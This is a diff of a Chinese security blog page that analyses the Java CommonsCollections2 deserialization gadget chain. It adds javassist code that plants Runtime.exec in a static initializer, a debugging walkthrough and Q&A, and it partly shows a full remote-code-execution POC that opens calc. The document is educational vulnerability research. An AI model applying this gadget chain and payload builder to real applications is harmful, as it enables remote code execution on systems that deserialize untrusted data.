@@ -6,12 +6,12 @@
   <meta name="keywords" content=" Hexo , Markdown ">
   <meta name="description" content="Java反序列化-CommonsCollections2分析 | 六月的雨">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="CommonsCollections2版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖： &lt;depend">
+<meta name="description" content="Java反序列化CommonsCollections2分析版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java反序列化-CommonsCollections2分析">
 <meta property="og:url" content="http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="六月的雨">
-<meta property="og:description" content="CommonsCollections2版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖： &lt;depend">
+<meta property="og:description" content="Java反序列化CommonsCollections2分析版本要求：  DK版本：无要求 CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)  具备知识：  反射 动态代理 javassist ClassLoader#defineClass TemplatesImpl  添加依赖：">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://static.tianshouzhi.com/ueditor/upload/image/20170429/1493459043588069152.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207095605754.png">
@@ -21,7 +21,7 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100532469.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207100729212.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207101514337.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207164530520.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208142627069.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155253060.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155417381.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155753453.png">
@@ -30,10 +30,19 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171730170.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172625630.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172842788.png">
-<meta property="og:image" content="c:/Users/20174/AppData/Roaming/Typora/typora-user-images/image-20211207173108483.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207173359890.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207173108483.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208112808772.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208112852872.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113438294.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113732686.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113854787.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115229516.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115307527.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161642509.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161936710.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208162850106.png">
 <meta property="article:published_time" content="2021-12-06T14:00:12.000Z">
-<meta property="article:modified_time" content="2021-12-08T03:17:47.457Z">
+<meta property="article:modified_time" content="2021-12-08T08:41:31.637Z">
 <meta property="article:author" content="juneRain">
 <meta property="article:tag" content="Hexo">
 <meta property="article:tag" content="Markdown">
@@ -362,7 +371,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="27">
-<input type="hidden" id="yelog_site_word_count" value="31.4k">
+<input type="hidden" id="yelog_site_word_count" value="32.4k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -685,12 +694,12 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2021-12-08 11:17:47'>2021-12-06 22:00</time>
+            Created At : <time class="date" title='Updated At: 2021-12-08 16:41:31'>2021-12-06 22:00</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:2.9k</span>
+        <span>Count:3.8k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -720,7 +729,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CommonsCollections2"><span class="toc-text">CommonsCollections2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-javassist%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x02 javassist学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ClassLoader-defineClass"><span class="toc-text">0x04 ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x05 利用链分析（命令执行）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9POC%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%A7%A3%E9%87%8A"><span class="toc-text">对POC的一些代码进行解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x06 利用链分析（代码执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%9A"><span class="toc-text">完整的利用链：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%EF%BC%9A"><span class="toc-text">完整的代码执行POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CommonsCollections2%E5%88%86%E6%9E%90"><span class="toc-text">Java反序列化CommonsCollections2分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-text">0x01利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-javassist%E5%AD%A6%E4%B9%A0"><span class="toc-text">0x02 javassist学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-ClassLoader-defineClass"><span class="toc-text">0x04 ClassLoader#defineClass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x05 利用链分析（命令执行）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9POC%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%A0%81%E8%BF%9B%E8%A1%8C%E8%A7%A3%E9%87%8A"><span class="toc-text">对POC的一些代码进行解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%9A"><span class="toc-text">0x06 利用链分析（代码执行）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%EF%BC%9A"><span class="toc-text">完整的代码执行POC：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-POC%E8%B0%83%E8%AF%95"><span class="toc-text">0x07 POC调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E7%96%91%E9%97%AE%E8%A7%A3%E7%AD%94%E8%AE%B0%E5%BD%95"><span class="toc-text">0x08 疑问解答记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A"><span class="toc-text">参考链接：</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -736,7 +745,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><p>版本要求：</p>
+        <h1 id="Java反序列化CommonsCollections2分析"><a href="#Java反序列化CommonsCollections2分析" class="headerlink" title="Java反序列化CommonsCollections2分析"></a>Java反序列化CommonsCollections2分析</h1><p>版本要求：</p>
 <ul>
 <li>DK版本：无要求</li>
 <li>CommonsCollections 4.0(cc3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化)</li>
@@ -761,17 +770,20 @@
     &lt;version&gt;3.25.0-GA&lt;/version&gt;
 &lt;/dependency&gt;
 </code></pre>
-<h2 id="0x01利用链"><a href="#0x01利用链" class="headerlink" title="0x01利用链"></a>0x01利用链</h2><p>PriorityQueue</p>
-<p>TransformingComparator.compare()</p>
-<p>InvokerTransformer</p>
-<pre><code>TemplatesImpl.getOutputProperties()
- TemplatesImpl.newTransformer()
-TemplatesImpl.getTransletInstance()
-TemplatesImpl.defineTransletClasses()
-TransletClassLoader.defineClass()
+<h2 id="0x01利用链"><a href="#0x01利用链" class="headerlink" title="0x01利用链"></a>0x01利用链</h2><pre><code>ObjectInputStream.readObject()
+    PriorityQueue.readObject()
+        PriorityQueue.heapify()
+            PriorityQueue.siftDown()
+                PriorityQueue.siftDownUsingComparator()
+                    TransformingComparator.compare()
+                        InvokerTransformer.transform()
+                                Method.invoke()
+                                    TemplatesImpl.newTransformer()
+                                         TemplatesImpl.getTransletInstance()
+                                         TemplatesImpl.defineTransletClasses
+                                         newInstance()
+                                            Runtime.exec()
 </code></pre>
-<p>ClassLoader#defineClass</p>
-<p>javassist</p>
 <h2 id="0x02-javassist学习"><a href="#0x02-javassist学习" class="headerlink" title="0x02 javassist学习"></a>0x02 javassist学习</h2><p>因为本次利用链需要用到，所以需要先了解一下javassist是干嘛的</p>
 <p>javassit是用于对生成的class文件进行修改，或以完全手动的方式，生成一个class文件。</p>
 <p>假设我们需要生成一个User类：</p>
@@ -848,7 +860,8 @@ TransletClassLoader.defineClass()
 <p>name=wangxiaoxiao</p>
 <p>通过反编译工具(例如：JD-gui )打开User.class 可以看到类似以下代码：</p>
 <p><img src="http://static.tianshouzhi.com/ueditor/upload/image/20170429/1493459043588069152.png" alt="Image.png"></p>
-<h2 id="0x04-ClassLoader-defineClass"><a href="#0x04-ClassLoader-defineClass" class="headerlink" title="0x04 ClassLoader#defineClass"></a>0x04 ClassLoader#defineClass</h2><pre><code>public class JavasistTest &#123;
+<h2 id="0x04-ClassLoader-defineClass"><a href="#0x04-ClassLoader-defineClass" class="headerlink" title="0x04 ClassLoader#defineClass"></a>0x04 ClassLoader#defineClass</h2><p>ClassLoader是Java的类加载器，负责将字节码转化成内存中的Java类。</p>
+<pre><code>public class JavasistTest &#123;
 
    public static void main(String[] args) throws Exception&#123;
        //使用Javasist生成一个.class文件
@@ -959,38 +972,25 @@ public class cc2Test &#123;
 </code></pre>
 <p>到这里其实我们发现cc2中使用的是javasist 和 TemplatesImpl，利用字节码来进行执行代码的，因为我们上的POC只能执行命令，无法造成代码执行，所以下面我们分析下第二种利用方式</p>
 <h2 id="0x06-利用链分析（代码执行）："><a href="#0x06-利用链分析（代码执行）：" class="headerlink" title="0x06 利用链分析（代码执行）："></a>0x06 利用链分析（代码执行）：</h2><p>这里才是真正的CC2，能够进行RCE。</p>
-<p>我们先分析后半条链，也就是如何触发RCE的。然后在拼接前半条链，我个人喜欢逆向先知道如何触发RCE，再找入口去触发后半条链。</p>
+<p>我们先分析后半条链，也就是如何触发RCE的。然后在拼接前半条链，我个人喜欢逆向先知道如何触发RCE，再找入口去调用后半条链。</p>
 <p>第一步：首先我们使用javassist，生成静态代码块，注意：静态代码块会在创建类实例的时候执行。</p>
-<pre><code>import javassist.*;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
-import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
-import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+<pre><code>import javassist.ClassPool;
+import javassist.CtClass;
 
-public class javassit_test &#123;
-    public static void createPseson() throws Exception &#123;
-
-        ClassPool pool = ClassPool.getDefault();
-        CtClass cc = pool.makeClass(&quot;Cat&quot;);
-        String cmd = &quot;System.out.println(\&quot;evil code\&quot;);&quot;;
-        // 创建 static 代码块，并插入代码
-        cc.makeClassInitializer().insertBefore(cmd);
+public class test2 &#123;
+    public static void main(String[] args) throws Exception &#123;
+        ClassPool pool = ClassPool.getDefault();//返回默认的类池
+        CtClass cc = pool.makeClass(&quot;Cat&quot;);//创建一个新的public类
+        cc.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);
         String randomClassName = &quot;EvilCat&quot; + System.nanoTime();
         cc.setName(randomClassName);
         // 写入.class 文件
         cc.writeFile();
     &#125;
-
-    public static void main(String[] args) &#123;
-        try &#123;
-            createPseson();
-        &#125; catch (Exception e) &#123;
-            e.printStackTrace();
-        &#125;
-    &#125;
 &#125;
 </code></pre>
 <p>使用jadx-gui查看生成的class文件</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207164530520.png" alt="image-20211207164530520"></p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208142627069.png" alt="image-20211208142627069"></p>
 <p>第二步：我们看回TemplatesImpl，主要是利用TemplatesImpl触发上面的静态代码块，形成后半条链，这个思路不能乱。</p>
 <p>TemplatesImpl#newTransformer()调用了getTransletInstance()：</p>
 <p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207155253060.png" alt="image-20211207155253060"></p>
@@ -1009,20 +1009,6 @@ public class javassit_test &#123;
 <p>我们需要想办法找到入口调用TemplatesImpl.newTransformer()，来拼接后半条链。</p>
 <p>这里使用了InvokerTransformer#transform的反射来调用TemplatesImpl#newtransformer，我们可以使用前面说到的第一二步，简单化的链我理解长下面这样：</p>
 <p>入口PriorityQueue.readObject()-&gt;&gt;TransformingComparator.compare()–&gt;&gt;InvokerTransformer#transform–&gt;&gt;InvokerTransformer#transform</p>
-<h2 id="完整的利用链："><a href="#完整的利用链：" class="headerlink" title="完整的利用链："></a>完整的利用链：</h2><pre><code>ObjectInputStream.readObject()
-    PriorityQueue.readObject()
-        PriorityQueue.heapify()
-            PriorityQueue.siftDown()
-                PriorityQueue.siftDownUsingComparator()
-                    TransformingComparator.compare()
-                        InvokerTransformer.transform()
-                                Method.invoke()
-                                    TemplatesImpl.newTransformer()
-                                         TemplatesImpl.getTransletInstance()
-                                         TemplatesImpl.defineTransletClasses
-                                         newInstance()
-                                            Runtime.exec()
-</code></pre>
 <h2 id="完整的代码执行POC："><a href="#完整的代码执行POC：" class="headerlink" title="完整的代码执行POC："></a>完整的代码执行POC：</h2><pre><code>import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.io.ObjectInputStream;
@@ -1045,7 +1031,7 @@ public class cc2 &#123;
         classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
         CtClass payload=classPool.makeClass(&quot;CommonsCollections22222222222&quot;);//创建一个新的public类
         payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
-        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); //创建一个空的类初始化，设置构造函数主体为runtime
+        payload.makeClassInitializer().setBody(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;); //创建一个空的类初始化，
 
         byte[] bytes=payload.toBytecode();//转换为byte数组
 
@@ -1083,25 +1069,80 @@ public class cc2 &#123;
     &#125;
 &#125;
 </code></pre>
-<p>0x07 POC调试</p>
+<h2 id="0x07-POC调试"><a href="#0x07-POC调试" class="headerlink" title="0x07 POC调试"></a>0x07 POC调试</h2><p>调试过程中，我也会对代码进行分析，为啥代码是这样写的</p>
 <p>从入口进行调试，使用readObject进行反序列化，这里调用的是PriorityQueue重写的的readobject</p>
 <pre><code>inputStream.readObject()
 </code></pre>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171552395.png" alt="image-20211207171552395"></p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171552395.png"></p>
 <p>PriorityQueue重写的的readobject会将序列化的字节码进行反序列化，然后赋给queue[i]，跟进heapify()：</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171832993.png" alt="image-20211207171832993"></p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171832993.png"></p>
 <p>调用了siftDown()，跟进siftDown()</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171730170.png" alt="image-20211207171730170"></p>
-<p>调用了siftDownUsingComparator(k,x)，这里的x就是siftDown()中的queue[i]，所以是可控的</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172625630.png" alt="image-20211207172625630"></p>
-<p>跟进到<code>siftDownUsingComparator</code>方法里面，发现会方法会去调用<code>comparator</code>的<code>compare</code>,因为我们这里的<code>compare</code>是被<code>TransformingComparator</code>修饰过的<code>InvokerTransformer</code>实例化对象。所以这里调用的就是<code>TransformingComparator</code>的<code>compare</code>。</p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172842788.png" alt="image-20211207172842788"></p>
-<p>跟进到方法里面，<code>this.iMethodName</code>内容为<code>newTransformer</code>反射调用了<code>newTransformer</code>方法。再跟进一下。</p>
-<p><img src="C:\Users\20174\AppData\Roaming\Typora\typora-user-images\image-20211207173108483.png" alt="image-20211207173108483"></p>
-<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207173359890.png" alt="image-20211207173359890"></p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207171730170.png"></p>
+<p>调用了siftDownUsingComparator(k,x)，这里的x就是siftDown()中的queue[i]，所以是可控的。</p>
+<p>发现该方法会去调用comparator的compare,因为我们这里的compare是被TransformingComparator修饰过的InvokerTransformer实例化对象。所以这里调用的就是TransformingComparator的compare。这里比较绕，需要结合POC一起看才能理解。因为我们事先就设置好PriorityQueue方法中的compare值为TransformingComparator的compare了。</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172625630.png"></p>
+<pre><code>InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[]&#123;&#125;,new Object[]&#123;&#125;);
+TransformingComparator comparator =new TransformingComparator(transformer);
+PriorityQueue queue = new PriorityQueue(2);
+
+Field field2=queue.getClass().getDeclaredField(&quot;comparator&quot;);
+field2.setAccessible(true);
+field2.set(queue,comparator);
+</code></pre>
+<p>继续进到<code>TransformingComparator</code>的compare方法中。</p>
+<p>TransformingComparator#compare</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207172842788.png"></p>
+<p>跟进到方法里面，<code>this.iMethodName</code>内容为newTransformer反射调用了<code>newTransformer</code>方法。再跟进一下。</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211207173108483.png"></p>
+<p>跟进templatesImpl#newTransformer</p>
+<p>这里比较关键了，我们为啥要进去这个方法getTransletInstance，我们先跟进getTransletInstance方法</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208112808772.png" alt="image-20211208112808772"></p>
+<p>第一条if (_name == nul) ，就立即返回，所以我们一开始就设置了__name为一个值，这个值填什么都可以</p>
+<p>第二条if是关键，这里的_class默认就是null，所以我们不需要进行设置。我们上面提问了为啥要进去这个方法getTransletInstance，主要是为了调用defineTransletClasses，然后通过defineTransletClasses去执行最终的代码块导致RCE。</p>
+<p>templatesImpl#getTransletInstance</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208112852872.png" alt="image-20211208112852872"></p>
+<p>方框内可以看到将_bytecodes赋值给_class,这里的_bytecodes就是我们设置好的静态代码块的字节码</p>
+<p>templatesImpl#defineTransletClasses</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113438294.png" alt="image-20211208113438294"></p>
+<p>跟着调试F8，调回getTransletInstance方法，可以看到对_class进行了实例化，也就是这里触发了静态代码块的代码执行。</p>
+<p>templatesImpl#getTransletInstance</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113732686.png" alt="image-20211208113732686"></p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208113854787.png" alt="image-20211208113854787"></p>
+<h2 id="0x08-疑问解答记录"><a href="#0x08-疑问解答记录" class="headerlink" title="0x08 疑问解答记录"></a>0x08 疑问解答记录</h2><p>1.为什么要设置恶意类的父类为AbstractTranslet?</p>
+<p>在<code>TemplatesImpl</code>的 <code>defineTransletClasses()</code>函数中在利用defineClass获取到我们的字节码之后会对读取的字节码进行一个判断，判断是否继承自<code>AbstractTranslet</code>，所以我们在javasist生成字节码的时候要设置父类：</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115229516.png" alt="image-20211208115229516"></p>
+<p>我们需要令_transletIndex为i，此时的i为0，默认状态下_transletIndex的值为-1，而如果_transletIndex的值小于0，就会抛出异常：</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208115307527.png" alt="image-20211208115307527"></p>
+<p>2.CC2链的poc利用代码中为什么要向queue队列中添加至少2个元素？并且PriorityQueue队列中的queue属性被transient关键字修饰具有“不会序列化”语义，在反序列化过程中为什么还能从流中读取queue的数据，流中的数据又从何而来？</p>
+<p>使用SerializationDumper工具解析对象序列化的数据，Fields字段中并没有看到PriorityQueue的queue属性，说明queue确实没有参与序列化，但是PriorityQueue重写了Serializable接口的writeObject和readObject方法实现自定义序列化与反序列化。</p>
+<p>工具链接：</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161642509.png" alt="image-20211208161642509"></p>
+<p>PriorityQueue集合中的成员属性如下：</p>
+<pre><code class="java">public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123;
+    private static final long serialVersionUID = -7720805057305804111L;
+    private static final int DEFAULT_INITIAL_CAPACITY = 11;
+    private transient Object[] queue;
+    private int size = 0;
+    private final Comparator&lt;? super E&gt; comparator;
+    private transient int modCount = 0;
+
+&#125;
+</code></pre>
+<p>可以看到集合中的静态变量和被transient关键字修饰的成员变量不会参与序列化，最终只有size和comparator两个成员会参与序列化与反序列化过程。</p>
+<p>那原因是什么呢？我们可以查看PriorityQueue类，里面重写了的writeObject方法，发现对queue属性里的内容进行了序列化。</p>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208161936710.png" alt="image-20211208161936710"></p>
+<p>有同学可能会有疑惑：java序列化机制不允许被transient关键字修饰的成员属性参与序列化，那为啥还是能调用writeObject方法进行序列化？</p>
+<p>​        这里跟反射和封装性一样，存在其合理。如果使用默认的方式进行序列化（实现Serializable接口但不重写writeObject和readObject方法），transient关键字修饰的成员属性确实不会参与序列化，并且成员属性的内容也不会序列化。但是重写了writeObject和readObject方法就可以实现自定义序列化，调用writeObject方法并传入queue属性，这样的话queue中的内容依然会参与序列化。</p>
+<p>3.为什么为什么这里要put两个值进去?</p>
+<pre><code>queue.add(1);
+queue.add(2);
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/JuneRainBlog/img/master/image-20211208162850106.png" alt="image-20211208162850106"></p>
+<p>size &gt;&gt;&gt; 1是移位运算符，这里意思是向右移一位，所以需要size&gt;=2 ，才能进入循环。</p>
 <h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1242/#_8">https://paper.seebug.org/1242/#_8</a></p>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd">https://mp.weixin.qq.com/s?__biz=Mzg3OTU3MzI4Mg==&amp;mid=2247483897&amp;idx=1&amp;sn=b8d6b00abc2c8be1abafd30814f9f9d6&amp;chksm=cf0321b4f874a8a2a6e1983a4f8023f25e41ba9779d10188581cd9218f7a18ec74b298f7cc94&amp;token=1815809254&amp;lang=zh_CN#rd</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219840#h2-0">https://www.anquanke.com/post/id/219840#h2-0</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35733751/article/details/119008552">https://blog.csdn.net/qq_35733751/article/details/119008552</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2017441810@qq.com </span>
@@ -1116,10 +1157,10 @@ public class cc2 &#123;
 
 <div class="article_copyright">
     <p><span class="copy-title">Title:</span>Java反序列化-CommonsCollections2分析</p>
-    <p><span class="copy-title">Count:</span><span class="post-count">2.9k</span></p>
+    <p><span class="copy-title">Count:</span><span class="post-count">3.8k</span></p>
     <p><span class="copy-title">Author:</span><a  title="juneRain">juneRain</a></p>
     <p><span class="copy-title">Created At:</span>2021-12-06, 22:00:12</p>
-    <p><span class="copy-title">Updated At:</span>2021-12-08, 11:17:47</p>
+    <p><span class="copy-title">Updated At:</span>2021-12-08, 16:41:31</p>
     <span class="copy-title">Url:</span><a class="post-url" href="/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/" title="Java反序列化-CommonsCollections2分析">http://example.com/2021/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CommonsCollections2%E5%88%86%E6%9E%90/</a>
     <p>
         <span class="copy-title">Copyright:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">&#39;Attribution-non-commercial-shared in the same way 4.0&#39;</a> Reprint please keep the original link and author.
